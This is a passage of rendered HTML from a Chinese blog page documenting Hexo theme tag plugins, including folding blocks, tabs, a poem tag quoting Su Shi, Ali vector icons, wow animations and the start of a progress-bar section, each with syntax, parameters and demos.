red</li><li><code>状态</code>：状态填写 open 代表默认打开。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 查看图片测试 %&#125;</span><br><span class="line"></span><br><span class="line">![](<span class="link">https://fastly.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg</span>)</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding cyan open, 查看默认打开的折叠框 %&#125;</span><br><span class="line"></span><br><span class="line">这是一个默认打开的折叠框。</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding green, 查看代码测试 %&#125;</span><br><span class="line">假装这里有代码块（代码块没法嵌套代码块）</span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding yellow, 查看列表测试 %&#125;</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> haha</span><br><span class="line"><span class="bullet">-</span> hehe</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding red, 查看嵌套测试 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding blue, 查看嵌套测试2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding 查看嵌套测试3 %&#125;</span><br><span class="line"></span><br><span class="line">hahaha <span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://fastly.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;height:24px&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><details class="folding-tag" ><summary> 查看图片测试 </summary>              <div class='content'>              <p><img src="https://fastly.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg" alt=""></p>              </div>            </details><details class="folding-tag" cyan open><summary> 查看默认打开的折叠框 </summary>              <div class='content'>              <p>这是一个默认打开的折叠框。</p>              </div>            </details><details class="folding-tag" green><summary> 查看代码测试 </summary>              <div class='content'>              <p>假装这里有代码块（代码块没法嵌套代码块）</p>              </div>            </details><details class="folding-tag" yellow><summary> 查看列表测试 </summary>              <div class='content'>              <ul><li>haha</li><li>hehe</li></ul>              </div>            </details><details class="folding-tag" red><summary> 查看嵌套测试 </summary>              <div class='content'>              <details class="folding-tag" blue><summary> 查看嵌套测试2 </summary>              <div class='content'>              <details class="folding-tag" ><summary> 查看嵌套测试3 </summary>              <div class='content'>              <p>hahaha <code>&lt;span&gt;&lt;img src='https://fastly.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png' style='height:24px'&gt;</code></p>              </div>            </details>              </div>            </details>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="分栏-tab">分栏 tab</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs Unique name, [index] %&#125;</span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line">Any content (support inline tags too).</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p>Unique name :</p><ul><li>选项卡块标签的唯一名称，不带逗号。</li><li>将在#id中用作每个标签及其索引号的前缀。</li><li>如果名称中包含空格，则对于生成#id，所有空格将由破折号代替。</li><li>仅当前帖子/页面的URL必须是唯一的！</li></ul></li><li><p>[index]:</p><ul><li>活动选项卡的索引号。</li><li>如果未指定，将选择第一个标签（1）。</li><li>如果index为-1，则不会选择任何选项卡。</li><li>可选参数。</li></ul></li><li><p>[Tab caption]:</p><ul><li>当前选项卡的标题。</li><li>如果未指定标题，则带有制表符索引后缀的唯一名称将用作制表符的标题。</li><li>如果未指定标题，但指定了图标，则标题将为空。</li><li>可选参数。</li></ul></li><li><p>[@icon]:</p><ul><li>FontAwesome图标名称（全名，看起来像“ fas fa-font”）</li><li>可以指定带空格或不带空格；</li><li>例如’Tab caption @icon’ 和 ‘Tab caption@icon’.</li><li>可选参数。</li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.Demo 1 - 预设选择第一个【默认】</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>2.Demo 2 - 预设选择tabs</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test2, 3 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>3.Demo 3 - 没有预设值</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test3, -1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>4.Demo 4 - 自定义Tab名 + 只有icon + icon和Tab名</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test4 %&#125;</span><br><span class="line">&lt;!-- tab 第一个Tab --&gt;</span><br><span class="line"><span class="strong">**tab名字为第一个Tab**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab @fab fa-apple-pay --&gt;</span><br><span class="line"><span class="strong">**只有图标 没有Tab名字**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 炸弹@fas fa-bomb --&gt;</span><br><span class="line"><span class="strong">**名字+icon**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.Demo 1 - 预设选择第一个【默认】</p><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">test1 1</button></li><li class="tab"><button type="button" data-href="#test1-2">test1 2</button></li><li class="tab"><button type="button" data-href="#test1-3">test1 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>2.Demo 2 - 预设选择tabs</p><div class="tabs" id="test2"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test2-1">test2 1</button></li><li class="tab"><button type="button" data-href="#test2-2">test2 2</button></li><li class="tab active"><button type="button" data-href="#test2-3">test2 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test2-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test2-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="test2-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>3.Demo 3 - 没有预设值</p><div class="tabs" id="test3"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test3-1">test3 1</button></li><li class="tab"><button type="button" data-href="#test3-2">test3 2</button></li><li class="tab"><button type="button" data-href="#test3-3">test3 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test3-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>4.Demo 4 - 自定义Tab名 + 只有icon + icon和Tab名</p><div class="tabs" id="test4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test4-1">第一个Tab</button></li><li class="tab"><button type="button" data-href="#test4-2"><i class="fab fa-apple-pay" style="text-align: center;"></i></button></li><li class="tab"><button type="button" data-href="#test4-3"><i class="fas fa-bomb"></i>炸弹</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test4-1"><p><strong>tab名字为第一个Tab</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-2"><p><strong>只有图标 没有Tab名字</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-3"><p><strong>名字+icon</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="诗词标签-poem">诗词标签 poem</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><ol><li><code>title</code>：诗词标题</li><li><code>author</code>：作者，可以不写</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% poem 水调歌头,苏轼 %&#125;</span><br><span class="line">丙辰中秋，欢饮达旦，大醉，作此篇，兼怀子由。</span><br><span class="line">明月几时有？把酒问青天。</span><br><span class="line">不知天上宫阙，今夕是何年？</span><br><span class="line">我欲乘风归去，又恐琼楼玉宇，高处不胜寒。</span><br><span class="line">起舞弄清影，何似在人间？</span><br><span class="line"></span><br><span class="line">转朱阁，低绮户，照无眠。</span><br><span class="line">不应有恨，何事长向别时圆？</span><br><span class="line">人有悲欢离合，月有阴晴圆缺，此事古难全。</span><br><span class="line">但愿人长久，千里共婵娟。</span><br><span class="line">&#123;% endpoem %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class='poem'><div class='poem-title'>水调歌头</div><div class='poem-author'>苏轼</div><p>丙辰中秋，欢饮达旦，大醉，作此篇，兼怀子由。<br>明月几时有？把酒问青天。<br>不知天上宫阙，今夕是何年？<br>我欲乘风归去，又恐琼楼玉宇，高处不胜寒。<br>起舞弄清影，何似在人间？</p><p>转朱阁，低绮户，照无眠。<br>不应有恨，何事长向别时圆？<br>人有悲欢离合，月有阴晴圆缺，此事古难全。<br>但愿人长久，千里共婵娟。</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="阿里图标-icon">阿里图标 icon</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% icon [icon-xxxx],[font-size] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>icon-xxxx</code>：表示图标 <code>font-class</code>,可以在自己的阿里矢量图标库项目的 <code>font-class</code>引用方案内查询并复制。</li><li><code>font-size</code>：表示图标大小，直接填写数字即可，单位为 <code>em</code>。图标大小默认值为 <code>1em</code>。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;% icon icon-rat<span class="emphasis">_zi %&#125;&#123;% icon icon-rat,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-ox_</span>chou,3 %&#125;&#123;% icon icon-ox,4 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-tiger<span class="emphasis">_yin,5 %&#125;&#123;% icon icon-tiger,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rabbit_</span>mao,1 %&#125;&#123;% icon icon-rabbit,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dragon<span class="emphasis">_chen,3 %&#125;&#123;% icon icon-dragon,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-snake_</span>si,5 %&#125;&#123;% icon icon-snake,6 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-horse<span class="emphasis">_wu %&#125;&#123;% icon icon-horse,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-goat_</span>wei,3 %&#125;&#123;% icon icon-goat,4 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-monkey<span class="emphasis">_shen,5 %&#125;&#123;% icon icon-monkey,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rooster_</span>you %&#125;&#123;% icon icon-rooster,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dog<span class="emphasis">_xu,3 %&#125;&#123;% icon icon-dog,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-boar_</span>hai,5 %&#125;&#123;% icon icon-boar,6 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rat_zi"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rat"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-ox_chou"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-ox"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-tiger_yin"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-tiger"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rabbit_mao"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rabbit"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dragon_chen"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dragon"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-snake_si"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-snake"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-horse_wu"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-horse"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-goat_wei"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-goat"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-monkey_shen"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-monkey"></use></svg></p><p><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rooster_you"></use></svg><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rooster"></use></svg></p><p><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dog_xu"></use></svg><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dog"></use></svg></p><p><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-boar_hai"></use></svg><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-boar"></use></svg></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="特效标签wow">特效标签wow</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow [animete],[duration],[delay],[offset],[iteration] %&#125;</span><br><span class="line">内容</span><br><span class="line">&#123;% endwow %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>animate</code>: 动画样式，效果详见<a href="https://animate.style/">animate.css参考文档</a></li><li><code>duration</code>: 选填项，动画持续时间，单位可以是 <code>ms</code>也可以是 <code>s</code>。例如 <code>3s</code>，<code>700ms</code>。</li><li><code>delay</code>: 选填项，动画开始的延迟时间，单位可以是 <code>ms</code>也可以是 <code>s</code>。例如 <code>3s</code>，<code>700ms</code>。</li><li><code>offset</code>: 选填项，开始动画的距离（相对浏览器底部）</li><li><code>iteration</code>: 选填项，动画重复的次数</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.flip动画效果。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`动画效果，持续`5s`，延时`5s`，离底部`100`距离时启动，重复`10`次</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>2.zoomIn动画效果，持续5s，延时5s，离底部100距离时启动，重复10次</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`动画效果，持续`5s`，延时`5s`，离底部`100`距离时启动，重复`10`次</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>3.slideInRight动画效果，持续5s，延时5s</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__slideInRight,5s,5s %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note orange &#x27;fas fa-car&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`slideInRight`动画效果，持续`5s`，延时`5s`。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><p>4.heartBeat动画效果，延时5s，重复10次。此处注意不用的参数位置要留空，用逗号间隔。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__heartBeat,,5s,,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note red &#x27;fas fa-battery-half&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`heartBeat`动画效果，延时`5s`，重复`10`次。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.flip动画效果。</p><div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='10' ><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p><code>zoomIn</code>动画效果，持续 <code>5s</code>，延时 <code>5s</code>，离底部 <code>100</code>距离时启动，重复 <code>10</code>次</p></div></div><p>2.zoomIn动画效果，持续5s，延时5s，离底部100距离时启动，重复10次</p><div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='10' ><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p><code>zoomIn</code>动画效果，持续 <code>5s</code>，延时 <code>5s</code>，离底部 <code>100</code>距离时启动，重复 <code>10</code>次</p></div></div><p>3.slideInRight动画效果，持续5s，延时5s</p><div class='wow animate__slideInRight' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='' ><div class="note orange icon-padding modern"><i class="note-icon fas fa-car"></i><p><code>slideInRight</code>动画效果，持续 <code>5s</code>，延时 <code>5s</code>。</p></div></div><p>4.heartBeat动画效果，延时5s，重复10次。此处注意不用的参数位置要留空，用逗号间隔。</p><div class='wow animate__heartBeat' data-wow-duration='' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='10' ><div class="note red icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p><code>heartBeat</code>动画效果，延时 <code>5s</code>，重复 <code>10</code>次。</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="进度条-progress">进度条 progress</h2><div class="note info flat"><p>进度条标签参考<a href="https://rongbuqiu.com/jdt.html">沂佰孜猫-给HEXO文章添加彩色进度条</a>。<br>源样式提取自<a href="https://zwying0814.gitbook.io/cuteen/">Cuteen</a>主题。</p></div><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">参数配置</button></li><li class="tab"><button type="button" 